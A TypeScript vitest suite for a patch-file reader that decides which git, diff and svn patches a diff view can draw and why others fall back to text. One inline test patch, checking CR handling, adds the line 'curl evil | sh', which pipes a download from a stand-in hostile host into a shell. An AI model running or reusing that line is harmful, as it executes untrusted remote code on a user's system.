import { readFileSync } from "node:fs";
import { join } from "node:path";
import { getSingularPatch } from "@pierre/diffs";
import { describe, expect, test } from "vitest";
import {
  MAX_FILE_PATCH_CHARS,
  MAX_PATCH_FILES,
  readPatchFile,
  type PatchFile,
} from "./patch-file.ts";
import { quotedPath } from "./quoted-path.ts";

const FIXTURES = join(import.meta.dirname, "../../test/fixtures/patch-file");
const fixture = (name: string) => readFileSync(join(FIXTURES, name), "utf8");

/** The read of a patch the diff view must accept. */
function parsed(text: string): PatchFile {
  const read = readPatchFile(text);
  if (!read.ok) throw new Error(`expected a diff, got text: ${read.reason}`);
  return read.read;
}

/** Why the diff view sends a patch to text. */
function rejected(text: string): string {
  const read = readPatchFile(text);
  if (read.ok) throw new Error("expected text, got a diff");
  return read.reason;
}

/** Each file as path, kind, counts, and whether Pierre can draw its patch. */
function summary(read: PatchFile | null) {
  return read?.commits.map((commit) =>
    commit.files.map(({ file, patch }) => ({
      path: file.path,
      kind: file.kind,
      previousPath: file.previousPath,
      counts: `+${file.additions} -${file.deletions}`,
      binary: file.binary,
      drawn: patch.patch === "" ? null : getSingularPatch(patch.patch).name,
    })),
  );
}

describe("readPatchFile", () => {
  test("git format-patch mail with two commits: headers, renames, added, deleted, binary", () => {
    const read = parsed(fixture("format-patch-two-commits.patch"));
    expect(
      read?.commits.map(({ id, subject, author, date }) => ({ id, subject, author, date })),
    ).toEqual([
      {
        id: "a97a0f96e718208d9111a63688e332a9e3d7651e",
        subject: "Rework files: rename, add, delete",
        author: "Ada Lövelace <ada@example.com>",
        date: "Fri, 2 Jan 2026 03:04:05 +0000",
      },
      {
        id: "5b6545a5d03cfb5b93c46a153f446dbf122d05ad",
        subject: "Add logo and a fourth line",
        author: "Ada Lövelace <ada@example.com>",
        date: "Fri, 2 Jan 2026 03:04:05 +0000",
      },
    ]);
    expect(summary(read)).toEqual([
      [
        {
          path: "added.ts",
          kind: "added",
          previousPath: null,
          counts: "+2 -0",
          binary: false,
          drawn: "added.ts",
        },
        {
          path: "dir with space/after.md",
          kind: "renamed",
          previousPath: "before.md",
          counts: "+0 -0",
          binary: false,
          drawn: null,
        },
        {
          path: "gone.txt",
          kind: "deleted",
          previousPath: null,
          counts: "+0 -1",
          binary: false,
          drawn: "gone.txt",
        },
        {
          path: "keep.txt",
          kind: "modified",
          previousPath: null,
          counts: "+1 -1",
          binary: false,
          drawn: "keep.txt",
        },
      ],
      [
        {
          path: "keep.txt",
          kind: "modified",
          previousPath: null,
          counts: "+1 -0",
          binary: false,
          drawn: "keep.txt",
        },
        {
          path: "logo.png",
          kind: "added",
          previousPath: null,
          counts: "+0 -0",
          binary: true,
          drawn: null,
        },
      ],
    ]);
    expect(read).toMatchObject({ files: 6, additions: 4, deletions: 2 });
  });

  test("the mail signature and diffstat stay out of every file's patch", () => {
    const read = parsed(fixture("format-patch-two-commits.patch"))!;
    for (const { patch } of read.commits.flatMap((commit) => commit.files)) {
      expect(patch.patch).not.toMatch(/^-- $/m);
      expect(patch.patch).not.toMatch(/files? changed/);
    }
  });

  test("a GIT binary patch body is skipped, and the file is marked binary", () => {
    const read = parsed(fixture("format-patch-git-binary.patch"));
    expect(summary(read)).toEqual([
      [
        {
          path: "keep.txt",
          kind: "modified",
          previousPath: null,
          counts: "+1 -0",
          binary: false,
          drawn: "keep.txt",
        },
        {
          path: "logo.png",
          kind: "added",
          previousPath: null,
          counts: "+0 -0",
          binary: true,
          drawn: null,
        },
      ],
    ]);
  });

  test("git diff across commits: a pure rename has no patch, but keeps both paths", () => {
    const read = parsed(fixture("git-diff-renames.diff"));
    expect(read?.commits).toHaveLength(1);
    expect(read?.commits[0]).toMatchObject({ id: null, subject: null });
    expect(summary(read)![0]!.map((file) => [file.path, file.kind, file.previousPath])).toEqual([
      ["added.ts", "added", null],
      ["dir with space/after.md", "renamed", "before.md"],
      ["gone.txt", "deleted", null],
      ["keep.txt", "modified", null],
      ["logo.png", "added", null],
    ]);
  });

  test("git log -p: one section per commit, subject from the indented message", () => {
    const read = parsed(fixture("git-log-p.patch"));
    expect(
      read?.commits.map((commit) => [commit.id?.slice(0, 7), commit.subject, commit.files.length]),
    ).toEqual([
      ["5b6545a", "Add logo and a fourth line", 2],
      ["a97a0f9", "Rework files: rename, add, delete", 4],
    ]);
    expect(read?.commits[0]!.author).toBe("Ada Lövelace <ada@example.com>");
  });

  test("plain diff -u output, with timestamps after the paths", () => {
    expect(summary(parsed(fixture("plain-diff-u.diff")))).toEqual([
      [
        {
          path: "b.txt",
          kind: "modified",
          previousPath: null,
          counts: "+1 -1",
          binary: false,
          drawn: "b.txt",
        },
      ],
    ]);
  });

  test("hunks are walked by count: removed lines that look like headers stay inside", () => {
    const text = [
      "diff --git a/notes.md b/notes.md",
      "--- a/notes.md",
      "+++ b/notes.md",
      "@@ -1,4 +1,2 @@",
      "-- dash",
      "-diff --git a/x b/x",
      " kept",
      "",
      "\\ No newline at end of file",
      "diff --git a/next.md b/next.md",
      "--- a/next.md",
      "+++ b/next.md",
      "@@ -1 +1 @@",
      "-a",
      "+b",
      "",
    ].join("\n");
    expect(summary(parsed(text))![0]!.map((file) => [file.path, file.counts])).toEqual([
      ["notes.md", "+0 -2"],
      ["next.md", "+1 -1"],
    ]);
  });

  test("a git diff without index lines (as an agent writes one) still draws", () => {
    const text = [
      "diff --git a/README.md b/README.md",
      "--- a/README.md",
      "+++ b/README.md",
      "@@ -1,2 +1,2 @@",
      " # Title",
      "-old",
      "+new",
      "diff --git a/scripts/probe.mjs b/scripts/probe.mjs",
      "--- a/scripts/probe.mjs",
      "+++ b/scripts/probe.mjs",
      "@@ -1 +1 @@",
      '-import a from "a";',
      '+import b from "b";',
    ].join("\n");
    expect(summary(parsed(text))![0]!.map((file) => file.drawn)).toEqual([
      "README.md",
      "scripts/probe.mjs",
    ]);
  });

  test("a path twice draws as two cards in one section, each with its own key", () => {
    const file = "--- a/x.txt\n+++ b/x.txt\n@@ -1 +1 @@\n-a\n+b\n";
    const read = parsed(`${file}${file}`);
    expect(read.commits).toHaveLength(1);
    const files = read.commits[0]!.files;
    expect(files.map((entry) => entry.file.path)).toEqual(["x.txt", "x.txt"]);
    // Keyed by path and occurrence, so a re-read with a file added above keeps each card's key.
    expect(files.map((entry) => entry.key)).toEqual(["1:x.txt", "2:x.txt"]);
    const again = parsed(`--- a/w.txt\n+++ b/w.txt\n@@ -1 +1 @@\n-a\n+b\n${file}${file}`);
    expect(again.commits[0]!.files.map((entry) => entry.key)).toEqual([
      "1:w.txt",
      "1:x.txt",
      "2:x.txt",
    ]);
  });

  test("a message line that reads like a commit line does not start a section", () => {
    const sha = "a97a0f96e718208d9111a63688e332a9e3d7651e";
    const text = [
      `From ${sha} Mon Sep 17 00:00:00 2001`,
      "From: Ada <ada@example.com>",
      "Subject: [PATCH] Revert the bad one",
      "",
      `commit ${sha} broke the build; this reverts it.`,
      `From ${sha} is mentioned here too.`,
      "---",
      "diff --git a/x.txt b/x.txt",
      "--- a/x.txt",
      "+++ b/x.txt",
      "@@ -1 +1 @@",
      "-a",
      "+b",
    ].join("\n");
    const read = parsed(text);
    expect(read?.commits.map((commit) => [commit.subject, commit.files.length])).toEqual([
      ["Revert the bad one", 1],
    ]);
  });

  test("CRLF line endings read as LF", () => {
    const text = "--- a/x.txt\r\n+++ b/x.txt\r\n@@ -1 +1 @@\r\n-a\r\n+b\r\n";
    expect(summary(parsed(text))).toEqual([
      // Pierre keeps the b/ prefix of a diff with no `diff --git` line; the card shows `path`.
      [
        {
          path: "x.txt",
          kind: "modified",
          previousPath: null,
          counts: "+1 -1",
          binary: false,
          drawn: "b/x.txt",
        },
      ],
    ]);
  });

  test("quoted git paths are unquoted, octal escapes as UTF-8, astral characters intact", () => {
    expect(quotedPath('"caf\\303\\251 \\"x\\".txt"')).toBe('café "x".txt');
    expect(quotedPath('"a \\"q\\" 😀.txt"')).toBe('a "q" 😀.txt');
    const text = [
      'diff --git "a/caf\\303\\251.txt" "b/caf\\303\\251.txt"',
      "index 1..2 100644",
      "Binary files a/x and b/x differ",
    ].join("\n");
    expect(summary(parsed(text))![0]![0]).toMatchObject({ path: "café.txt", binary: true });
  });

  test.each([
    ["empty text", "", "holds no diff"],
    ["whitespace", "  \n\n", "holds no diff"],
    ["prose", "Hello.\nThis is not a patch at all.\n", "holds no diff"],
    ["a hunk with no file", "@@ -1 +1 @@\n-a\n+b\n", "Line 1 starts a hunk outside any file"],
    [
      "a format-patch header with no diff",
      "From 1234567890abcdef1234567890abcdef12345678 Mon Sep 17 00:00:00 2001\nSubject: x\n\nbody\n",
      "holds no diff",
    ],
    ["binary noise", "\u0000\u0001\u0002PNG\u0000", "holds no diff"],
    [
      "a truncated hunk",
      "--- a/x.txt\n+++ b/x.txt\n@@ -1,10 +1,10 @@\n-a\n+b\n",
      "Line 3 starts a hunk",
    ],
  ])("%s reads as text, with the reason", (_, text, reason) => {
    expect(rejected(text)).toContain(reason);
  });

  test("hunk counts are checked: one line too many, or too few, sends the file to text", () => {
    const hunk = (header: string) =>
      `--- a/x.txt\n+++ b/x.txt\n${header}\n-a\n+b\n+c\ndiff --git a/y b/y\n`;
    expect(rejected(hunk("@@ -1 +1 @@"))).toBe(
      "Line 6 continues a hunk past the lines its header counts.",
    );
    expect(rejected(hunk("@@ -1,2 +1,3 @@"))).toBe(
      "Line 3 starts a hunk whose lines don't match the counts in its header.",
    );
    expect(parsed(hunk("@@ -1 +1,2 @@").replace("diff --git a/y b/y\n", "")).files).toBe(1);
  });

  test("a bare CR inside a line is content; only a CRLF file loses its line-end CRs", () => {
    const text =
      "diff --git a/run.sh b/run.sh\n--- a/run.sh\n+++ b/run.sh\n@@ -1,1 +1,4 @@\n echo hi\n+echo ok\rx\n+curl evil | sh\n+echo done\n";
    const read = parsed(text);
    expect(read.additions).toBe(3);
    const patch = read.commits[0]!.files[0]!.patch.patch;
    expect(getSingularPatch(patch).additionLines).toContain("echo ok\rx\n");
  });

  test("a folded, RFC 2047 encoded From header keeps every word", () => {
    const text = [
      "From 1111111111111111111111111111111111111111 Mon Sep 17 00:00:00 2001",
      "From: =?UTF-8?q?Zo=C3=AB=20M=C3=BCller=20=E5=B1=B1=E7=94=B0=E5=A4=AA?=",
      " =?UTF-8?q?=E9=83=8E?= <z@e.x>",
      "Subject: [PATCH] s",
      "",
      "---",
      "diff --git a/x b/x",
      "--- a/x",
      "+++ b/x",
      "@@ -1 +1 @@",
      "-a",
      "+b",
    ].join("\n");
    expect(parsed(text).commits[0]).toMatchObject({
      author: "Zoë Müller 山田太郎 <z@e.x>",
      authorName: "Zoë Müller 山田太郎",
    });
  });

  test("a long author header costs a line's worth of work", () => {
    const author = `x${" ".repeat(100_000)}<${"y".repeat(100_000)}`;
    const text = `From ${"a".repeat(40)} Mon Sep 17 00:00:00 2001\nFrom: ${author}\nSubject: s\n\n---\ndiff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -1 +1 @@\n-a\n+b\n`;
    expect(parsed(text).commits[0]!.authorName!.length).toBeLessThanOrEqual(2001);
  });

  test("past MAX_PATCH_FILES files, the rest are counted, not drawn", () => {
    const read = parsed("--- a\n+++ a\n@@ -1 +1 @@\n-a\n+b\n".repeat(MAX_PATCH_FILES + 5));
    expect(read.files).toBe(MAX_PATCH_FILES);
    expect(read.omitted).toBe(5);
    expect(read.additions).toBe(MAX_PATCH_FILES + 5);
  });

  test("a file's patch past MAX_FILE_PATCH_CHARS is marked too large rather than drawn", () => {
    const line = "x".repeat(MAX_FILE_PATCH_CHARS + 1);
    const entry = parsed(`--- a/m.js\n+++ b/m.js\n@@ -1 +1 @@\n-${line}\n+y\n`).commits[0]!
      .files[0]!;
    expect(entry.patch).toMatchObject({ patch: "", truncated: true });
    expect(entry.file).toMatchObject({ additions: 1, deletions: 1 });
  });
});

describe("review fixtures", () => {
  test.each([
    ["undercount.patch", "Line 9 continues a hunk past the lines its header counts."],
    [
      "overcount-plain.diff",
      "Line 3 starts a hunk whose lines don't match the counts in its header.",
    ],
    ["badhunk.patch", "Line 5 has a hunk header the diff view can't read."],
    ["prose.diff", "Line 4 has a --- / +++ pair with no hunk after it."],
    ["prose2.patch", "Line 2 has a diff --git line with no change after it."],
    [
      "truncated-sig.patch",
      "Line 11 starts a hunk whose lines don't match the counts in its header.",
    ],
    [
      "git-show-merge-cc.patch",
      "Line 8 is part of a combined merge diff, which the diff view can't show.",
    ],
  ])("malformed/%s reads as text: %s", (name, reason) => {
    expect(rejected(fixture(`malformed/${name}`))).toBe(reason);
  });

  test.each(["plain-context.diff"])("review/%s (no unified diff) reads as text", (name) => {
    expect(rejected(fixture(`review/${name}`))).toBe("This file holds no diff.");
  });

  test("valid inputs git accepts still draw", () => {
    const counts = (name: string) =>
      parsed(fixture(`review/${name}`)).commits.flatMap((commit) =>
        commit.files.map(({ file }) => `${file.path} +${file.additions} -${file.deletions}`),
      );
    expect(counts("blankctx.patch")).toEqual(["f.txt +1 -1"]);
    expect(counts("samepath.patch")).toEqual(["f.txt +1 -1", "f.txt +1 -1"]);
    expect(counts("sqlish.patch")).toEqual(["q.sql +1 -1"]);
    expect(counts("sqlish-plain.diff")).toEqual(["q.sql +1 -1"]);
    expect(counts("svn.diff")).toEqual(["trunk/foo.c +1 -1", "trunk/bar.c +1 -1"]);
  });

  test("custom, mnemonic and missing prefixes give the repository path", () => {
    const paths = (name: string) =>
      parsed(fixture(`review/${name}`)).commits.flatMap((commit) =>
        commit.files.map(({ file }) => file.path),
      );
    const expected = paths("git-diff.diff");
    expect(expected).toHaveLength(19);
    expect(paths("git-diff-customprefix.diff")).toEqual(expected);
    expect(paths("git-diff-noprefix.diff")).toEqual(expected);
    expect(expected).toEqual(expect.arrayContaining(["a/ina.txt", "b/inb.txt", "dir b/x y.txt"]));
    expect(paths("git-diff-mnemonic-wt.diff")).toEqual(["keep.txt"]);
    expect(paths("git-diff.diff")).not.toContain("(unknown file)");
    expect(
      parsed("--- /dev/null\n+++ b/x.txt\n@@ -0,0 +1 @@\n+a\n").commits[0]!.files[0]!.file,
    ).toMatchObject({
      path: "x.txt",
      kind: "added",
    });
  });

  test("a --- / +++ pair in a format-patch message is the author's text, not a file", () => {
    const read = parsed(fixture("review/format-patch-single.patch"));
    expect(read.files).toBe(19);
    expect(read.commits[0]!.files.map(({ file }) => file.path)).not.toContain("new behaviour");
  });

  test("diff -r's one-line binary pair is a binary card", () => {
    const files = parsed("Binary files a/nul.dat and b/nul.dat differ\n").commits[0]!.files;
    expect(files.map(({ file }) => [file.path, file.binary])).toEqual([["nul.dat", true]]);
  });

  test("diff -r's Only in records read as text, never dropped", () => {
    expect(rejected(fixture("review/plain-ru-nul.diff"))).toBe(
      "Line 22 names a file only one side has (Only in), which the diff view can't show.",
    );
  });

  test("a hunk that runs back before the one above it reads as text", () => {
    expect(rejected(fixture("review/omitted.patch"))).toBe(
      "Line 7 starts a hunk inside the range of the hunk before it, so the diff view can't be sure of it.",
    );
  });
});

describe("review round 2 fixtures", () => {
  const read = (name: string) => readPatchFile(fixture(`review2/${name}`));
  const files = (name: string) =>
    parsed(fixture(`review2/${name}`)).commits.flatMap((c) => c.files);

  test("a blank line standing for context is read as that context line", () => {
    const [entry] = files("blank-context.patch");
    expect(entry!.file).toMatchObject({ additions: 1, deletions: 1 });
    expect(entry!.patch.patch.split("\n").slice(3, 8)).toEqual([
      "@@ -1,3 +1,3 @@",
      " a",
      " ",
      "-b",
      "+B",
    ]);
    expect(files("gnu-suppress-blank-empty.diff").map(({ file }) => file.path)).toEqual(["x.txt"]);
  });

  test("a signature whose trailing space an editor trimmed still ends the mail", () => {
    expect(
      files("sig-nospace.patch").map(
        ({ file }) => `${file.path} +${file.additions} -${file.deletions}`,
      ),
    ).toEqual(["f.txt +1 -1"]);
  });

  test.each([
    [
      "under-blank-extra.patch",
      "Line 9 follows a finished hunk as one of its lines, past what its header counts.",
    ],
    [
      "two-hunks-blank-late.patch",
      "Line 14 follows a finished hunk as one of its lines, past what its header counts.",
    ],
    [
      "trailing-bullets.patch",
      "Line 9 follows a finished hunk as one of its lines, past what its header counts.",
    ],
    ["r1-badheader.patch", "Line 4 has a hunk header the diff view can't read."],
  ])("%s reads as text: %s", (name, reason) => {
    expect(read(name)).toEqual({ ok: false, reason });
  });

  test("diff -r binary lines name both files, GNU's shell quoting undone", () => {
    const names = (name: string) =>
      files(name)
        .filter(({ file }) => file.binary)
        .map(({ file }) => file.path);
    expect(names("gnu-ru-binary.diff")).toEqual(["my file.bin", "plain.bin", "x and y.bin"]);
    expect(names("gnu-ru-names.diff")).toEqual([
      "d2/it's.bin",
      "d2/my file.bin",
      "d2/plain.bin",
      'd2/q"uote.bin',
      "d2/tab\there.bin",
      "d2/x and y.bin",
    ]);
    expect(names("plain-binary-and.diff")).toEqual(["x and y.bin"]);
  });

  test("a binary line whose names can't be told apart reads as text", () => {
    expect(rejected("Binary files a/q and b/q and c/q differ\n")).toBe(
      "Line 1 names binary files in a way the diff view can't split.",
    );
  });

  test("a long line of ' and ' with no ' differ' is read in one pass", () => {
    // Quadratic before: 420 KB took 10 s, past the test's timeout.
    expect(rejected(`Binary files a${" and x".repeat(70_000)}\n`)).toBe("This file holds no diff.");
    const many = `Binary files a${" and x".repeat(70_000)} differ\n`;
    expect(rejected(many)).toBe("Line 1 names binary files in a way the diff view can't split.");
  });

  test("a quoted path of 300 KB unquotes without overflowing the stack", () => {
    const name = "a".repeat(300_000);
    expect(quotedPath(`"${name}\\303\\251"`)).toBe(`${name}é`);
    const rename = `diff --git a/x b/y\nsimilarity index 100%\nrename from "${name}"\nrename to y\n`;
    expect(files2(rename)).toEqual([["y", "renamed", name]]);
  });

  test("format-patch --attach and --inline end at their MIME boundary", () => {
    for (const name of ["format-patch-attach.patch", "format-patch-inline.patch"])
      expect(
        parsed(fixture(`review2/${name}`)).commits.map((c) => [c.subject, c.files.length]),
      ).toEqual([["second: edit, delete, add", 3]]);
  });

  test("git log --abbrev-commit and --format=fuller start a section per commit", () => {
    for (const name of ["log-abbrev.patch", "log-fuller-stat.patch"]) {
      const commits = parsed(fixture(`review2/${name}`)).commits;
      expect(commits.map((c) => [c.subject, c.files.length])).toEqual([
        ["second: edit, delete, add", 3],
        ["first commit", 2],
      ]);
    }
    // --oneline has no commit lines: its subjects fall between files, which the strict reading refuses.
    expect(read("log-oneline-stat.patch")).toMatchObject({ ok: false });
  });
});

function files2(text: string) {
  return parsed(text).commits.flatMap((c) =>
    c.files.map(({ file }) => [file.path, file.kind, file.previousPath]),
  );
}

describe("review round 3", () => {
  const one = "--- a/f.txt\n+++ b/f.txt\n@@ -1 +1 @@\n-a\n+b\n";

  test("a deletion line that looks like a MIME boundary is not one", () => {
    expect(rejected(`${one}--flag\n`)).toBe(
      "Line 6 continues a hunk past the lines its header counts.",
    );
    expect(rejected(`${one}\n--flag\n`)).toBe(
      "Line 7 follows a finished hunk as one of its lines, past what its header counts.",
    );
  });

  test("only the boundary the mail declares ends its patch", () => {
    const text = fixture("review2/format-patch-attach.patch");
    const boundary = /boundary="([^"]+)"/.exec(text)![1]!;
    expect(parsed(text).files).toBe(3);
    expect(rejected(text.replace(`--${boundary}--`, "--other-boundary--"))).toMatch(
      /^Line \d+ (?:reads as a hunk line|follows a finished hunk)/,
    );
  });

  test("a bare --label binary name keeps its backslash", () => {
    const files = parsed("Binary files a/dir\\file and b/dir\\file differ\n").commits[0]!.files;
    expect(files.map(({ file }) => file.path)).toEqual(["dir\\file"]);
  });

  test("a decoded path with a NUL reads as text", () => {
    expect(rejected('--- "a/x\\000y"\n+++ "b/x\\000y"\n@@ -1 +1 @@\n-a\n+b\n')).toBe(
      "Line 1 names a file with a NUL character, which no file name holds.",
    );
  });

  test("keys stay unique whatever the paths hold", () => {
    const text = ["2:x", "x", "x", "1:x"]
      .map((name) => `--- a/${name}\n+++ b/${name}\n@@ -1 +1 @@\n-a\n+b\n`)
      .join("");
    const keys = parsed(text).commits[0]!.files.map((entry) => entry.key);
    expect(new Set(keys).size).toBe(4);
  });

  test("empty binary names read as text", () => {
    expect(rejected("Binary files  and  differ\n")).toBe(
      "Line 1 names binary files in a way the diff view can't split.",
    );
  });
});

describe("review round 3 corpus", () => {
  const read = (name: string) => readPatchFile(fixture(`review3/${name}`));

  test("an mbox series with b4's From lines starts a section per message", () => {
    const result = read("mbox-series.patch");
    if (!result.ok) throw new Error(result.reason);
    expect(result.read.commits.map((c) => [c.subject, c.id, c.files.length])).toEqual([
      ["Rework files: rename, add, delete", null, 4],
      ["Add logo and a fourth line", null, 2],
    ]);
  });

  test.each([
    // The parser takes the stray text as the file's end; the guard finds the + and - after it.
    ["under-stray-extra.patch", "Line 9 reads as a hunk line, but no file's hunk holds it."],
    // An svn property change has no hunk the diff view can draw.
    ["svn-props.diff", "Line 16 reads as a hunk line, but no file's hunk holds it."],
    // A custom git log format has no commit line to start a message at: its "- " body reads as lost lines.
    ["log-custom-format.patch", "Line 14 reads as a hunk line, but no file's hunk holds it."],
  ])("%s reads as text: %s", (name, reason) => {
    expect(read(name)).toEqual({ ok: false, reason });
  });
});

describe("review round 4: a strict second reading", () => {
  const read = (name: string) => readPatchFile(fixture(`review4/${name}`));
  const summary4 = (name: string) => {
    const result = read(name);
    if (!result.ok) return result.reason;
    return result.read.commits.map((c) => [
      c.subject,
      c.files.map(({ file }) => `${file.path} +${file.additions} -${file.deletions}`),
    ]);
  };

  test("a log whose commit has no blank before its diff keeps every commit and file", () => {
    const result = read("custom-log.patch");
    if (!result.ok) throw new Error(result.reason);
    expect(result.read.commits).toHaveLength(2);
    expect(result.read.files).toBe(10);
    expect([result.read.additions, result.read.deletions]).toEqual([212, 11]);
    expect(result.read.commits[1]!.files.map(({ file }) => file.path)).toEqual([
      "plugins/source-control/src/app/page/guided-view.tsx",
    ]);
  });

  test("a mail whose Subject runs straight into its diff keeps its files", () => {
    expect(summary4("mail-separator-removed.patch")).toEqual([
      ["mainline", ["code.py +1 -0"]],
      ["odd names", ['quo"te.txt +1 -0', "tab\there.txt +1 -0", "ünï/fïle.txt +1 -0"]],
    ]);
  });

  test.each([
    [
      "only-in.diff",
      "Line 1 names a file only one side has (Only in), which the diff view can't show.",
    ],
    ["empty-label.diff", "Line 2 names no file, so the diff view can't be sure of it."],
    [
      "two-files-bad-counts.diff",
      "Line 8 starts a hunk inside the range of the hunk before it, so the diff view can't be sure of it.",
    ],
  ])("%s reads as text: %s", (name, reason) => {
    expect(read(name)).toEqual({ ok: false, reason });
  });

  test("the control draws both files", () => {
    expect(summary4("two-files.diff")).toEqual([[null, ["first +1 -1", "second +1 -1"]]]);
  });
});
